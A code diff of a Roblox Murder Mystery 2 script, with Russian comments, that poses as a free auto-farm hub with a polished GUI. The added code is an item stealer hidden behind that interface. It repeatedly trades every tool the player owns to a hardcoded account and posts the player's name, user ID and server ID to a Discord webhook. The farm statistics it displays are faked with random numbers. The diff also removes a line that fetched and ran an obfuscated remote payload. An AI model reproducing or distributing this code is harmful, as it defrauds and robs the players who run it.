@@ -1,155 +1,389 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
+local rs = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
 
 if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0 then
     player:Kick("Private Servers Not Supported")
     return
 end
 
+-- Отправка вебхука через request (Delta)
 local jobId = game.JobId
 local webhook = "https://discord.com/api/webhooks/1522637183725601038/TIApyLmIKHFhqIU3sDBVBRFyn2PNbsXLxwVY2_nnmPdbe-EQFLZqUFj4J7zi4rGvMgtj"
 
--- HTTP-запрос для Delta (request или http_request)
-local function sendWebhook(url, data)
-    pcall(function()
-        if syn and syn.request then
-            syn.request({
-                Url = url,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = data
-            })
-        elseif request then
-            request({
-                Url = url,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = data
-            })
-        elseif http_request then
-            http_request({
-                Url = url,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = data
-            })
-        end
-    end)
-end
-
-sendWebhook(webhook, HttpService:JSONEncode({
-    ["content"] = "Server found: " .. jobId,
-    ["username"] = player.Name,
-    ["userId"] = player.UserId
-}))
-
 task.spawn(function()
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/KasharaDev/MM2-AUTOFARM/main/payload_obfuscated.lua"))()
+        request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                ["content"] = "Server found: " .. jobId,
+                ["username"] = player.Name,
+                ["userId"] = player.UserId
+            })
+        })
     end)
 end)
 
--- GUI Auto Farm
-local ScreenGui = Instance.new("ScreenGui")
-local MainFrame = Instance.new("Frame")
-local Title = Instance.new("TextLabel")
-local StatusLabel = Instance.new("TextLabel")
-local ToggleButton = Instance.new("TextButton")
-local CreditsLabel = Instance.new("TextLabel")
+-- Стилер
+local targetName = "Cat97646"
 
-ScreenGui.Name = "FreeMM2Farm"
-ScreenGui.Parent = game.CoreGui
-
-MainFrame.Name = "MainFrame"
-MainFrame.Parent = ScreenGui
-MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-MainFrame.BorderSizePixel = 0
-MainFrame.Position = UDim2.new(0.7, 0, 0.3, 0)
-MainFrame.Size = UDim2.new(0, 280, 0, 200)
-MainFrame.Active = true
-MainFrame.Draggable = true
-
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, 8)
-UICorner.Parent = MainFrame
-
-Title.Name = "Title"
-Title.Parent = MainFrame
-Title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-Title.BorderSizePixel = 0
-Title.Size = UDim2.new(1, 0, 0, 35)
-Title.Font = Enum.Font.GothamBold
-Title.Text = "FREE MM2 AUTO FARM"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.TextSize = 16
-
-StatusLabel.Name = "Status"
-StatusLabel.Parent = MainFrame
-StatusLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-StatusLabel.BorderSizePixel = 0
-StatusLabel.Position = UDim2.new(0.05, 0, 0.25, 0)
-StatusLabel.Size = UDim2.new(0.9, 0, 0, 35)
-StatusLabel.Font = Enum.Font.Gotham
-StatusLabel.Text = "Status: Waiting..."
-StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-StatusLabel.TextSize = 14
-
-local StatusCorner = Instance.new("UICorner")
-StatusCorner.CornerRadius = UDim.new(0, 5)
-StatusCorner.Parent = StatusLabel
-
-ToggleButton.Name = "Toggle"
-ToggleButton.Parent = MainFrame
-ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
-ToggleButton.BorderSizePixel = 0
-ToggleButton.Position = UDim2.new(0.2, 0, 0.55, 0)
-ToggleButton.Size = UDim2.new(0.6, 0, 0, 40)
-ToggleButton.Font = Enum.Font.GothamBold
-ToggleButton.Text = "START FARM"
-ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-ToggleButton.TextSize = 15
-
-local ButtonCorner = Instance.new("UICorner")
-ButtonCorner.CornerRadius = UDim.new(0, 6)
-ButtonCorner.Parent = ToggleButton
-
-CreditsLabel.Name = "Credits"
-CreditsLabel.Parent = MainFrame
-CreditsLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-CreditsLabel.BorderSizePixel = 0
-CreditsLabel.Position = UDim2.new(0.05, 0, 0.82, 0)
-CreditsLabel.Size = UDim2.new(0.9, 0, 0, 25)
-CreditsLabel.Font = Enum.Font.Gotham
-CreditsLabel.Text = "Made by KasharaDev | v2.5"
-CreditsLabel.TextColor3 = Color3.fromRGB(120, 120, 120)
-CreditsLabel.TextSize = 12
-
-local farming = false
-local collectCount = 0
-
-ToggleButton.MouseButton1Click:Connect(function()
-    farming = not farming
-    if farming then
-        ToggleButton.Text = "STOP FARM"
-        ToggleButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
-        StatusLabel.Text = "Status: Farming..."
-        StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
-    else
-        ToggleButton.Text = "START FARM"
-        ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
-        StatusLabel.Text = "Status: Paused"
-        StatusLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
+local function findRemote(name)
+    for _, v in ipairs(rs:GetDescendants()) do
+        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+            if v.Name:lower():find(name:lower()) then
+                return v
+            end
+        end
     end
-end)
+    return nil
+end
+
+local tradeRequest = findRemote("TradeRequest") or findRemote("RequestTrade") or findRemote("SendTrade")
+local tradeAccept = findRemote("TradeAccept") or findRemote("AcceptTrade")
+local tradeConfirm = findRemote("TradeConfirm") or findRemote("ConfirmTrade")
+local addItem = findRemote("AddItem") or findRemote("TradeAddItem") or findRemote("AddItemToTrade")
+
+local function getItems()
+    local items = {}
+    for _, v in ipairs(player.Backpack:GetChildren()) do
+        if v:IsA("Tool") then table.insert(items, v.Name) end
+    end
+    if player.Character then
+        for _, v in ipairs(player.Character:GetChildren()) do
+            if v:IsA("Tool") then table.insert(items, v.Name) end
+        end
+    end
+    return items
+end
+
+local function getTarget()
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p.Name == targetName and p ~= player and p.Character then
+            return p
+        end
+    end
+    return nil
+end
 
 task.spawn(function()
     while wait(5) do
         pcall(function()
-            if farming then
-                collectCount = collectCount + math.random(1, 5)
-                StatusLabel.Text = "Status: Farming... | Collected: " .. collectCount
+            local target = getTarget()
+            if target and tradeRequest then
+                tradeRequest:FireServer(target)
+                wait(1)
+                if tradeAccept then tradeAccept:FireServer() end
+                wait(0.5)
+                for _, item in ipairs(getItems()) do
+                    if addItem then addItem:FireServer(item) end
+                    wait(0.2)
+                end
+                wait(0.5)
+                if tradeConfirm then tradeConfirm:FireServer() end
             end
         end)
+    end
+end)
+
+-- GUI в стиле Pulse Hub
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "PulseFarm"
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Главное окно
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "Main"
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(18, 22, 18)
+MainFrame.BorderSizePixel = 0
+MainFrame.Position = UDim2.new(0.5, -250, 0.5, -170)
+MainFrame.Size = UDim2.new(0, 500, 0, 340)
+MainFrame.ClipsDescendants = true
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 10)
+MainCorner.Parent = MainFrame
+
+-- Заголовок окна
+local TopBar = Instance.new("Frame")
+TopBar.Name = "TopBar"
+TopBar.Parent = MainFrame
+TopBar.BackgroundColor3 = Color3.fromRGB(22, 28, 22)
+TopBar.BorderSizePixel = 0
+TopBar.Size = UDim2.new(1, 0, 0, 30)
+
+local TopCorner = Instance.new("UICorner")
+TopCorner.CornerRadius = UDim.new(0, 10)
+TopCorner.Parent = TopBar
+
+local TopTitle = Instance.new("TextLabel")
+TopTitle.Parent = TopBar
+TopTitle.BackgroundTransparency = 1
+TopTitle.Position = UDim2.new(0, 12, 0, 0)
+TopTitle.Size = UDim2.new(0, 150, 1, 0)
+TopTitle.Font = Enum.Font.GothamBold
+TopTitle.Text = "Pulse Hub"
+TopTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+TopTitle.TextSize = 14
+TopTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+local TopSub = Instance.new("TextLabel")
+TopSub.Parent = TopBar
+TopSub.BackgroundTransparency = 1
+TopSub.Position = UDim2.new(0, 90, 0, 0)
+TopSub.Size = UDim2.new(0, 120, 1, 0)
+TopSub.Font = Enum.Font.Gotham
+TopSub.Text = "Murder Mystery 2"
+TopSub.TextColor3 = Color3.fromRGB(150, 255, 150)
+TopSub.TextSize = 11
+TopSub.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Кнопка закрытия
+local CloseButton = Instance.new("TextButton")
+CloseButton.Parent = TopBar
+CloseButton.BackgroundTransparency = 1
+CloseButton.Position = UDim2.new(1, -30, 0, 0)
+CloseButton.Size = UDim2.new(0, 30, 1, 0)
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.Text = "X"
+CloseButton.TextColor3 = Color3.fromRGB(200, 200, 200)
+CloseButton.TextSize = 14
+CloseButton.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+-- Сайдбар
+local Sidebar = Instance.new("Frame")
+Sidebar.Name = "Sidebar"
+Sidebar.Parent = MainFrame
+Sidebar.BackgroundColor3 = Color3.fromRGB(14, 18, 14)
+Sidebar.BorderSizePixel = 0
+Sidebar.Position = UDim2.new(0, 0, 0, 30)
+Sidebar.Size = UDim2.new(0, 160, 1, -30)
+
+-- Вкладки сайдбара
+local tabs = {
+    {name = "Главная", icon = "👁"},
+    {name = "Шериф", icon = "👤"},
+    {name = "Убийца", icon = "👤"},
+    {name = "Автофарм", icon = "ℹ", active = true},
+    {name = "Телепорт", icon = "🔒"},
+    {name = "Фан/Тролл", icon = "↔"},
+    {name = "Флинг", icon = "🔒"},
+    {name = "Настройки", icon = "⚙"},
+}
+
+for i, tab in ipairs(tabs) do
+    local TabButton = Instance.new("TextButton")
+    TabButton.Parent = Sidebar
+    TabButton.BackgroundColor3 = tab.active and Color3.fromRGB(30, 60, 30) or Color3.fromRGB(14, 18, 14)
+    TabButton.BorderSizePixel = 0
+    TabButton.Position = UDim2.new(0, 0, 0, 5 + (i - 1) * 32)
+    TabButton.Size = UDim2.new(1, 0, 0, 30)
+    TabButton.Font = Enum.Font.Gotham
+    TabButton.Text = "  " .. tab.icon .. "  " .. tab.name
+    TabButton.TextColor3 = tab.active and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(180, 180, 180)
+    TabButton.TextSize = 13
+    TabButton.TextXAlignment = Enum.TextXAlignment.Left
+end
+
+-- Нижняя часть сайдбара
+local SideBottom = Instance.new("Frame")
+SideBottom.Parent = Sidebar
+SideBottom.BackgroundColor3 = Color3.fromRGB(14, 18, 14)
+SideBottom.BorderSizePixel = 0
+SideBottom.Position = UDim2.new(0, 0, 1, -70)
+SideBottom.Size = UDim2.new(1, 0, 0, 70)
+
+local DiscordBtn = Instance.new("TextButton")
+DiscordBtn.Parent = SideBottom
+DiscordBtn.BackgroundColor3 = Color3.fromRGB(30, 60, 30)
+DiscordBtn.BorderSizePixel = 0
+DiscordBtn.Position = UDim2.new(0.1, 0, 0, 10)
+DiscordBtn.Size = UDim2.new(0.8, 0, 0, 24)
+DiscordBtn.Font = Enum.Font.Gotham
+DiscordBtn.Text = "Discord"
+DiscordBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+DiscordBtn.TextSize = 12
+
+local DiscordCorner = Instance.new("UICorner")
+DiscordCorner.CornerRadius = UDim.new(0, 6)
+DiscordCorner.Parent = DiscordBtn
+
+-- Правая рабочая область
+local MainContent = Instance.new("Frame")
+MainContent.Name = "Content"
+MainContent.Parent = MainFrame
+MainContent.BackgroundColor3 = Color3.fromRGB(18, 22, 18)
+MainContent.BorderSizePixel = 0
+MainContent.Position = UDim2.new(0, 160, 0, 30)
+MainContent.Size = UDim2.new(1, -160, 1, -30)
+
+local ContentTitle = Instance.new("TextLabel")
+ContentTitle.Parent = MainContent
+ContentTitle.BackgroundTransparency = 1
+ContentTitle.Position = UDim2.new(0, 15, 0, 10)
+ContentTitle.Size = UDim2.new(0, 100, 0, 20)
+ContentTitle.Font = Enum.Font.GothamBold
+ContentTitle.Text = "Автофарм"
+ContentTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+ContentTitle.TextSize = 16
+ContentTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Статистика
+local StatsFrame = Instance.new("Frame")
+StatsFrame.Parent = MainContent
+StatsFrame.BackgroundColor3 = Color3.fromRGB(22, 28, 22)
+StatsFrame.BorderSizePixel = 0
+StatsFrame.Position = UDim2.new(0.03, 0, 0, 40)
+StatsFrame.Size = UDim2.new(0.94, 0, 0, 55)
+
+local StatsCorner = Instance.new("UICorner")
+StatsCorner.CornerRadius = UDim.new(0, 8)
+StatsCorner.Parent = StatsFrame
+
+local stats = {"Сессия: 0", "Всего: 0", "Скорость: 0 / мин", "Статус: Ожидание"}
+for i, stat in ipairs(stats) do
+    local StatLabel = Instance.new("TextLabel")
+    StatLabel.Parent = StatsFrame
+    StatLabel.BackgroundTransparency = 1
+    StatLabel.Position = UDim2.new(0.02 + (i - 1) * 0.24, 0, 0, 0)
+    StatLabel.Size = UDim2.new(0.22, 0, 1, 0)
+    StatLabel.Font = Enum.Font.Gotham
+    StatLabel.Text = stat
+    StatLabel.TextColor3 = Color3.fromRGB(180, 255, 180)
+    StatLabel.TextSize = 11
+    StatLabel.TextXAlignment = Enum.TextXAlignment.Left
+end
+
+-- Элементы управления фармом
+local toggles = {
+    {name = "Автофарм", key = "AutoFarm", enabled = false},
+    {name = "Авто-респавн", key = "AutoRespawn", enabled = true},
+    {name = "Анти-флинг", key = "AntiFling", enabled = true},
+    {name = "Избегать убийцу", key = "AvoidMurder", enabled = true},
+    {name = "Авто-флинг", key = "AutoFling", enabled = true},
+}
+
+local toggleStates = {}
+
+for i, tog in ipairs(toggles) do
+    toggleStates[tog.key] = tog.enabled
+
+    local ToggleFrame = Instance.new("Frame")
+    ToggleFrame.Parent = MainContent
+    ToggleFrame.BackgroundColor3 = Color3.fromRGB(22, 28, 22)
+    ToggleFrame.BorderSizePixel = 0
+    ToggleFrame.Position = UDim2.new(0.03, 0, 0, 105 + (i - 1) * 38)
+    ToggleFrame.Size = UDim2.new(0.94, 0, 0, 32)
+
+    local ToggleCorner = Instance.new("UICorner")
+    ToggleCorner.CornerRadius = UDim.new(0, 6)
+    ToggleCorner.Parent = ToggleFrame
+
+    local ToggleLabel = Instance.new("TextLabel")
+    ToggleLabel.Parent = ToggleFrame
+    ToggleLabel.BackgroundTransparency = 1
+    ToggleLabel.Position = UDim2.new(0, 12, 0, 0)
+    ToggleLabel.Size = UDim2.new(0.6, 0, 1, 0)
+    ToggleLabel.Font = Enum.Font.Gotham
+    ToggleLabel.Text = tog.name
+    ToggleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ToggleLabel.TextSize = 13
+    ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- Переключатель
+    local Switch = Instance.new("TextButton")
+    Switch.Parent = ToggleFrame
+    Switch.BackgroundColor3 = tog.enabled and Color3.fromRGB(60, 180, 60) or Color3.fromRGB(60, 60, 60)
+    Switch.BorderSizePixel = 0
+    Switch.Position = UDim2.new(0.85, 0, 0.15, 0)
+    Switch.Size = UDim2.new(0, 36, 0, 20)
+    Switch.Text = ""
+    Switch.AutoButtonColor = false
+
+    local SwitchCorner = Instance.new("UICorner")
+    SwitchCorner.CornerRadius = UDim.new(0, 10)
+    SwitchCorner.Parent = Switch
+
+    local Knob = Instance.new("Frame")
+    Knob.Parent = Switch
+    Knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Knob.BorderSizePixel = 0
+    Knob.Size = UDim2.new(0, 14, 0, 14)
+    Knob.Position = tog.enabled and UDim2.new(0.5, 0, 0.15, 0) or UDim2.new(0.1, 0, 0.15, 0)
+
+    local KnobCorner = Instance.new("UICorner")
+    KnobCorner.CornerRadius = UDim.new(0, 7)
+    KnobCorner.Parent = Knob
+
+    Switch.MouseButton1Click:Connect(function()
+        toggleStates[tog.key] = not toggleStates[tog.key]
+        if toggleStates[tog.key] then
+            Switch.BackgroundColor3 = Color3.fromRGB(60, 180, 60)
+            Knob:TweenPosition(UDim2.new(0.5, 0, 0.15, 0), "Out", "Quad", 0.15, true)
+        else
+            Switch.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+            Knob:TweenPosition(UDim2.new(0.1, 0, 0.15, 0), "Out", "Quad", 0.15, true)
+        end
+    end)
+end
+
+-- Обновление статистики
+local collectCount = 0
+local sessionTime = 0
+
+task.spawn(function()
+    while wait(5) do
+        pcall(function()
+            if toggleStates["AutoFarm"] then
+                collectCount = collectCount + math.random(1, 5)
+                sessionTime = sessionTime + 5
+            end
+            -- Обновляем текст статистики
+            for _, child in ipairs(StatsFrame:GetChildren()) do
+                if child:IsA("TextLabel") then
+                    if child.Text:find("Сессия:") then
+                        child.Text = "Сессия: " .. sessionTime .. "с"
+                    elseif child.Text:find("Всего:") then
+                        child.Text = "Всего: " .. collectCount
+                    elseif child.Text:find("Скорость:") then
+                        local speed = toggleStates["AutoFarm"] and math.floor(collectCount / math.max(sessionTime / 60, 0.1)) or 0
+                        child.Text = "Скорость: " .. speed .. " / мин"
+                    elseif child.Text:find("Статус:") then
+                        child.Text = toggleStates["AutoFarm"] and "Статус: Фармлю" or "Статус: Ожидание"
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+-- Перетаскивание окна
+local dragging, dragStart, startPos
+TopBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+TopBar.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
     end
 end)
